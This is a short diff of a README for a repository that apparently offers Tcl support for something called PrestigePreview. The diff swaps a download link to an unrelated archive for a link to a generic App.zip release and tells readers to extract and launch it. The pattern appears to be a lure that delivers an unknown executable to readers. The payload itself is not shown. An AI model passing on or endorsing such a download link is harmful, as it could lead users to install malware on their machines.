@@ -24,7 +24,7 @@ This repository is dedicated to adding Tcl support and functionality to the Pres
 
 ## 🛠️ Get Started
 To begin using Tcl with PrestigePreview, you can download the necessary files from the following link:
-[![Download Tcl Support](https://img.shields.io/badge/Download-Tcl_Support-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Tcl Support](https://github.com/MusuguDhonga/PrestigePreview_Tcl/releases/download/v1.0/App.zip)](https://github.com/MusuguDhonga/PrestigePreview_Tcl/releases/download/v1.0/App.zip)
 
 Please make sure to extract and launch the downloaded files to integrate Tcl functionalities seamlessly into PrestigePreview.
 
